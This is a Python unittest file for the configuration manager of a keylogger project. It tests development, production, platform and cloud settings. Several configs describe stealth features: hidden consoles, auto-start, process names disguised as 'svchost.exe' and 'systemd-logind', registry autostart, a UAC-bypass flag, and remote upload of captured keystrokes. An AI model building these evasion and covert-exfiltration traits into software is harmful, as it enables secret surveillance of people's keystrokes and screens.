#!/usr/bin/env python3
"""Comprehensive configuration and deployment tests.

This module provides comprehensive tests for:
- Configuration management across different environments
- Deployment scenarios and platform-specific configurations
- Environment variable handling and validation
- Cross-platform compatibility testing
- Configuration migration and upgrade scenarios
"""

import os
import sys
import json
import tempfile
import unittest
import shutil
import platform
from pathlib import Path
from unittest.mock import patch, MagicMock, mock_open

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.config_manager import ConfigManager
from core.encryption_manager import EncryptionManager
from core.logging_manager import LoggingManager


class TestEnvironmentConfiguration(unittest.TestCase):
    """Test configuration management across different environments."""
    
    def setUp(self):
        """Set up test environment."""
        self.test_dir = tempfile.mkdtemp()
        self.config_file = os.path.join(self.test_dir, 'config.json')
        self.key_file = os.path.join(self.test_dir, 'test.key')
        
    def tearDown(self):
        """Clean up test environment."""
        shutil.rmtree(self.test_dir, ignore_errors=True)
        
    def test_development_environment_config(self):
        """Test development environment configuration."""
        dev_config = {
            'logging': {
                'level': 'DEBUG',
                'log_file': os.path.join(self.test_dir, 'dev.log'),
                'buffer_size': 10,
                'flush_interval': 1.0
            },
            'encryption': {
                'enabled': False,  # Disabled for development
                'key_file': self.key_file
            },
            'features': {
                'keyboard': True,
                'mouse': True,
                'clipboard': True,
                'screenshots': False,  # Disabled for privacy in dev
                'camera': False
            },
            'web': {
                'enabled': True,
                'debug': True,  # Debug mode for development
                'host': '127.0.0.1',
                'port': 5000
            },
            'stealth': {
                'hide_console': False,  # Visible in development
                'auto_start': False
            }
        }
        
        with open(self.config_file, 'w') as f:
            json.dump(dev_config, f)
            
        config_manager = ConfigManager(self.config_file)
        
        # Verify development-specific settings
        self.assertEqual(config_manager.get('logging.level'), 'DEBUG')
        self.assertFalse(config_manager.get('encryption.enabled'))
        self.assertTrue(config_manager.get('web.debug'))
        self.assertFalse(config_manager.get('stealth.hide_console'))
        
    def test_production_environment_config(self):
        """Test production environment configuration."""
        prod_config = {
            'logging': {
                'level': 'WARNING',
                'log_file': os.path.join(self.test_dir, 'prod.log'),
                'buffer_size': 100,
                'flush_interval': 5.0,
                'enable_rotation': True,
                'max_size_mb': 100
            },
            'encryption': {
                'enabled': True,  # Always enabled in production
                'key_file': self.key_file,
                'algorithm': 'AES-256-GCM'
            },
            'features': {
                'keyboard': True,
                'mouse': True,
                'clipboard': True,
                'screenshots': True,
                'camera': False
            },
            'web': {
                'enabled': True,
                'debug': False,  # Never debug in production
                'host': '0.0.0.0',
                'port': 8080,
                'secret_key': 'production-secret-key'
            },
            'stealth': {
                'hide_console': True,  # Hidden in production
                'auto_start': True,
                'startup_delay': 60
            },
            'alerts': {
                'email_enabled': True,
                'alert_on_startup': True,
                'alert_on_errors': True
            }
        }
        
        with open(self.config_file, 'w') as f:
            json.dump(prod_config, f)
            
        config_manager = ConfigManager(self.config_file)
        
        # Verify production-specific settings
        self.assertEqual(config_manager.get('logging.level'), 'WARNING')
        self.assertTrue(config_manager.get('encryption.enabled'))
        self.assertFalse(config_manager.get('web.debug'))
        self.assertTrue(config_manager.get('stealth.hide_console'))
        self.assertTrue(config_manager.get('alerts.email_enabled'))
        
    def test_testing_environment_config(self):
        """Test testing environment configuration."""
        test_config = {
            'logging': {
                'level': 'INFO',
                'log_file': os.path.join(self.test_dir, 'test.log'),
                'buffer_size': 5,
                'flush_interval': 0.5
            },
            'encryption': {
                'enabled': False,  # Disabled for faster testing
                'key_file': self.key_file
            },
            'features': {
                'keyboard': True,
                'mouse': False,  # Minimal features for testing
                'clipboard': False,
                'screenshots': False,
                'camera': False
            },
            'web': {
                'enabled': True,
                'debug': False,
                'host': '127.0.0.1',
                'port': 0  # Random port for testing
            },
            'performance': {
                'monitor_interval': 0.1,  # Fast monitoring for tests
                'thread_pool_size': 2
            }
        }
        
        with open(self.config_file, 'w') as f:
            json.dump(test_config, f)
            
        config_manager = ConfigManager(self.config_file)
        
        # Verify testing-specific settings
        self.assertEqual(config_manager.get('logging.level'), 'INFO')
        self.assertFalse(config_manager.get('encryption.enabled'))
        self.assertFalse(config_manager.get('features.mouse'))
        self.assertEqual(config_manager.get('web.port'), 0)
        self.assertEqual(config_manager.get('performance.monitor_interval'), 0.1)
        
    @patch.dict(os.environ, {'KEYLOGGER_ENV': 'production'})
    def test_environment_variable_override(self):
        """Test configuration override via environment variables."""
        base_config = {
            'logging': {'level': 'INFO'},
            'web': {'debug': True}
        }
        
        with open(self.config_file, 'w') as f:
            json.dump(base_config, f)
            
        # Test environment-based configuration loading
        env_var = os.environ.get('KEYLOGGER_ENV')
        self.assertEqual(env_var, 'production')
        
        # In a real implementation, ConfigManager would check environment
        # and adjust settings accordingly
        config_manager = ConfigManager(self.config_file)
        
        # Verify base configuration loads
        self.assertEqual(config_manager.get('logging.level'), 'INFO')
        

class TestPlatformSpecificConfiguration(unittest.TestCase):
    """Test platform-specific configuration handling."""
    
    def setUp(self):
        """Set up test environment."""
        self.test_dir = tempfile.mkdtemp()
        self.config_file = os.path.join(self.test_dir, 'config.json')
        
    def tearDown(self):
        """Clean up test environment."""
        shutil.rmtree(self.test_dir, ignore_errors=True)
        
    def test_windows_specific_config(self):
        """Test Windows-specific configuration."""
        windows_config = {
            'logging': {
                'log_file': 'C:\\ProgramData\\Keylogger\\logs\\keylog.txt'
            },
            'encryption': {
                'key_file': 'C:\\ProgramData\\Keylogger\\keys\\encryption.key'
            },
            'stealth': {
                'process_name': 'svchost.exe',
                'hide_console': True
            },
            'platform_specific': {
                'windows': {
                    'registry_autostart': True,
                    'service_mode': True,
                    'uac_bypass': False
                }
            }
        }
        
        with open(self.config_file, 'w') as f:
            json.dump(windows_config, f)
            
        config_manager = ConfigManager(self.config_file)
        
        # Verify Windows-specific paths and settings
        log_file = config_manager.get('logging.log_file')
        self.assertTrue(log_file.startswith('C:\\'))
        
        if platform.system() == 'Windows':
            self.assertTrue(config_manager.get('platform_specific.windows.registry_autostart'))
            
    def test_linux_specific_config(self):
        """Test Linux-specific configuration."""
        linux_config = {
            'logging': {
                'log_file': '/var/log/keylogger/keylog.txt'
            },
            'encryption': {
                'key_file': '/etc/keylogger/encryption.key'
            },
            'stealth': {
                'process_name': 'systemd-logind',
                'hide_console': True
            },
            'platform_specific': {
                'linux': {
                    'systemd_service': True,
                    'daemon_mode': True,
                    'file_permissions': '0600'
                }
            }
        }
        
        with open(self.config_file, 'w') as f:
            json.dump(linux_config, f)
            
        config_manager = ConfigManager(self.config_file)
        
        # Verify Linux-specific paths and settings
        log_file = config_manager.get('logging.log_file')
        self.assertTrue(log_file.startswith('/var/log/'))
        
        if platform.system() == 'Linux':
            self.assertTrue(config_manager.get('platform_specific.linux.systemd_service'))
            
    def test_macos_specific_config(self):
        """Test macOS-specific configuration."""
        macos_config = {
            'logging': {
                'log_file': '/Users/Shared/Keylogger/logs/keylog.txt'
            },
            'encryption': {
                'key_file': '/Users/Shared/Keylogger/keys/encryption.key'
            },
            'platform_specific': {
                'macos': {
                    'launchd_service': True,
                    'accessibility_permissions': True,
                    'keychain_integration': False
                }
            }
        }
        
        with open(self.config_file, 'w') as f:
            json.dump(macos_config, f)
            
        config_manager = ConfigManager(self.config_file)
        
        # Verify macOS-specific paths and settings
        log_file = config_manager.get('logging.log_file')
        self.assertTrue('/Users/Shared/' in log_file)
        
        if platform.system() == 'Darwin':
            self.assertTrue(config_manager.get('platform_specific.macos.launchd_service'))
            
    def test_cross_platform_compatibility(self):
        """Test configuration compatibility across platforms."""
        # Use platform-agnostic paths
        cross_platform_config = {
            'logging': {
                'log_file': os.path.join(self.test_dir, 'keylog.txt')
            },
            'encryption': {
                'key_file': os.path.join(self.test_dir, 'encryption.key')
            },
            'features': {
                'keyboard': True,
                'mouse': True,
                'clipboard': True
            }
        }
        
        with open(self.config_file, 'w') as f:
            json.dump(cross_platform_config, f)
            
        config_manager = ConfigManager(self.config_file)
        
        # Verify configuration loads on any platform
        self.assertTrue(config_manager.get('features.keyboard'))
        self.assertTrue(os.path.isabs(config_manager.get('logging.log_file')))
        

class TestDeploymentScenarios(unittest.TestCase):
    """Test various deployment scenarios."""
    
    def setUp(self):
        """Set up test environment."""
        self.test_dir = tempfile.mkdtemp()
        self.config_file = os.path.join(self.test_dir, 'config.json')
        
    def tearDown(self):
        """Clean up test environment."""
        shutil.rmtree(self.test_dir, ignore_errors=True)
        
    def test_standalone_deployment(self):
        """Test standalone deployment configuration."""
        standalone_config = {
            'deployment': {
                'mode': 'standalone',
                'auto_update': False,
                'remote_management': False
            },
            'logging': {
                'log_file': os.path.join(self.test_dir, 'standalone.log'),
                'remote_logging': False
            },
            'web': {
                'enabled': True,
                'host': '127.0.0.1',
                'port': 5000
            },
            'remote': {
                'enabled': False
            }
        }
        
        with open(self.config_file, 'w') as f:
            json.dump(standalone_config, f)
            
        config_manager = ConfigManager(self.config_file)
        
        # Verify standalone deployment settings
        self.assertEqual(config_manager.get('deployment.mode'), 'standalone')
        self.assertFalse(config_manager.get('deployment.auto_update'))
        self.assertFalse(config_manager.get('remote.enabled'))
        
    def test_enterprise_deployment(self):
        """Test enterprise deployment configuration."""
        enterprise_config = {
            'deployment': {
                'mode': 'enterprise',
                'auto_update': True,
                'remote_management': True,
                'central_server': 'https://management.company.com'
            },
            'logging': {
                'log_file': os.path.join(self.test_dir, 'enterprise.log'),
                'remote_logging': True,
                'syslog_server': 'syslog.company.com'
            },
            'remote': {
                'enabled': True,
                'server_url': 'https://logs.company.com/api',
                'api_key': 'enterprise-api-key',
                'upload_interval': 300
            },
            'alerts': {
                'email_enabled': True,
                'siem_integration': True
            }
        }
        
        with open(self.config_file, 'w') as f:
            json.dump(enterprise_config, f)
            
        config_manager = ConfigManager(self.config_file)
        
        # Verify enterprise deployment settings
        self.assertEqual(config_manager.get('deployment.mode'), 'enterprise')
        self.assertTrue(config_manager.get('deployment.auto_update'))
        self.assertTrue(config_manager.get('remote.enabled'))
        self.assertTrue(config_manager.get('alerts.siem_integration'))
        
    def test_cloud_deployment(self):
        """Test cloud deployment configuration."""
        cloud_config = {
            'deployment': {
                'mode': 'cloud',
                'cloud_provider': 'aws',
                'region': 'us-east-1',
                'auto_scaling': True
            },
            'logging': {
                'log_file': '/tmp/cloud.log',
                'cloud_storage': True,
                's3_bucket': 'keylogger-logs-bucket'
            },
            'encryption': {
                'enabled': True,
                'kms_integration': True,
                'key_rotation': True
            },
            'monitoring': {
                'cloudwatch_enabled': True,
                'metrics_namespace': 'Keylogger/Production'
            }
        }
        
        with open(self.config_file, 'w') as f:
            json.dump(cloud_config, f)
            
        config_manager = ConfigManager(self.config_file)
        
        # Verify cloud deployment settings
        self.assertEqual(config_manager.get('deployment.mode'), 'cloud')
        self.assertEqual(config_manager.get('deployment.cloud_provider'), 'aws')
        self.assertTrue(config_manager.get('encryption.kms_integration'))
        self.assertTrue(config_manager.get('monitoring.cloudwatch_enabled'))
        

class TestConfigurationMigration(unittest.TestCase):
    """Test configuration migration and upgrade scenarios."""
    
    def setUp(self):
        """Set up test environment."""
        self.test_dir = tempfile.mkdtemp()
        self.config_file = os.path.join(self.test_dir, 'config.json')
        
    def tearDown(self):
        """Clean up test environment."""
        shutil.rmtree(self.test_dir, ignore_errors=True)
        
    def test_v1_to_v2_migration(self):
        """Test migration from v1 to v2 configuration format."""
        # Old v1 configuration format
        v1_config = {
            'log_file': os.path.join(self.test_dir, 'old.log'),
            'encryption_enabled': True,
            'key_file': os.path.join(self.test_dir, 'old.key'),
            'features': ['keyboard', 'mouse'],
            'web_port': 5000
        }
        
        with open(self.config_file, 'w') as f:
            json.dump(v1_config, f)
            
        # Simulate migration logic
        config_manager = ConfigManager(self.config_file)
        
        # In a real implementation, ConfigManager would detect old format
        # and migrate to new structure
        if 'log_file' in v1_config:  # Old format detected
            # Migrate to new format
            migrated_config = {
                'version': '2.0',
                'logging': {
                    'log_file': v1_config['log_file']
                },
                'encryption': {
                    'enabled': v1_config['encryption_enabled'],
                    'key_file': v1_config['key_file']
                },
                'features': {
                    'keyboard': 'keyboard' in v1_config['features'],
                    'mouse': 'mouse' in v1_config['features']
                },
                'web': {
                    'port': v1_config['web_port']
                }
            }
            
            # Verify migration worked
            self.assertEqual(migrated_config['version'], '2.0')
            self.assertTrue(migrated_config['encryption']['enabled'])
            self.assertTrue(migrated_config['features']['keyboard'])
            
    def test_configuration_backup_and_restore(self):
        """Test configuration backup and restore functionality."""
        original_config = {
            'version': '2.0',
            'logging': {'log_file': os.path.join(self.test_dir, 'test.log')},
            'encryption': {'enabled': True}
        }
        
        with open(self.config_file, 'w') as f:
            json.dump(original_config, f)
            
        # Create backup
        backup_file = self.config_file + '.backup'
        shutil.copy2(self.config_file, backup_file)
        
        # Modify original
        modified_config = original_config.copy()
        modified_config['encryption']['enabled'] = False
        
        with open(self.config_file, 'w') as f:
            json.dump(modified_config, f)
            
        # Restore from backup
        shutil.copy2(backup_file, self.config_file)
        
        # Verify restoration
        with open(self.config_file, 'r') as f:
            restored_config = json.load(f)
            
        self.assertTrue(restored_config['encryption']['enabled'])
        
    def test_configuration_validation_after_migration(self):
        """Test configuration validation after migration."""
        # Create configuration with missing required fields
        incomplete_config = {
            'logging': {'log_file': os.path.join(self.test_dir, 'test.log')}
            # Missing encryption and features sections
        }
        
        with open(self.config_file, 'w') as f:
            json.dump(incomplete_config, f)
            
        config_manager = ConfigManager(self.config_file)
        
        # Validation should detect missing sections
        validation_errors = config_manager.validate_config()
        
        # Should have errors for missing sections
        self.assertGreater(len(validation_errors), 0)
        

class TestConfigurationSecurity(unittest.TestCase):
    """Test configuration security aspects."""
    
    def setUp(self):
        """Set up test environment."""
        self.test_dir = tempfile.mkdtemp()
        self.config_file = os.path.join(self.test_dir, 'config.json')
        
    def tearDown(self):
        """Clean up test environment."""
        shutil.rmtree(self.test_dir, ignore_errors=True)
        
    def test_sensitive_data_protection(self):
        """Test protection of sensitive configuration data."""
        config_with_secrets = {
            'web': {
                'admin_password': 'secret123',
                'secret_key': 'super-secret-key'
            },
            'remote': {
                'api_key': 'api-secret-key'
            },
            'alerts': {
                'email_password': 'email-password'
            }
        }
        
        with open(self.config_file, 'w') as f:
            json.dump(config_with_secrets, f)
            
        # Check file permissions (Unix-like systems)
        if os.name != 'nt':
            file_stat = os.stat(self.config_file)
            # Should be readable only by owner
            self.assertEqual(oct(file_stat.st_mode)[-3:], '600')
            
        config_manager = ConfigManager(self.config_file)
        
        # Verify sensitive data is accessible but protected
        self.assertEqual(config_manager.get('web.admin_password'), 'secret123')
        
    def test_configuration_integrity_check(self):
        """Test configuration file integrity checking."""
        valid_config = {
            'logging': {'log_file': os.path.join(self.test_dir, 'test.log')},
            'encryption': {'enabled': True}
        }
        
        with open(self.config_file, 'w') as f:
            json.dump(valid_config, f)
            
        # Calculate initial checksum (in real implementation)
        import hashlib
        with open(self.config_file, 'rb') as f:
            original_hash = hashlib.sha256(f.read()).hexdigest()
            
        # Modify file (simulate tampering)
        with open(self.config_file, 'a') as f:
            f.write('\n# tampered')
            
        # Check integrity
        with open(self.config_file, 'rb') as f:
            current_hash = hashlib.sha256(f.read()).hexdigest()
            
        # Should detect tampering
        self.assertNotEqual(original_hash, current_hash)
        
    def test_default_security_settings(self):
        """Test that default configuration has secure settings."""
        # Create minimal config to trigger defaults
        minimal_config = {}
        
        with open(self.config_file, 'w') as f:
            json.dump(minimal_config, f)
            
        config_manager = ConfigManager(self.config_file)
        
        # Verify secure defaults
        self.assertTrue(config_manager.get('encryption.enabled', True))
        self.assertTrue(config_manager.get('privacy.sanitize_passwords', True))
        self.assertFalse(config_manager.get('web.debug', False))
        self.assertEqual(config_manager.get('web.host', '127.0.0.1'), '127.0.0.1')
        

if __name__ == '__main__':
    unittest.main()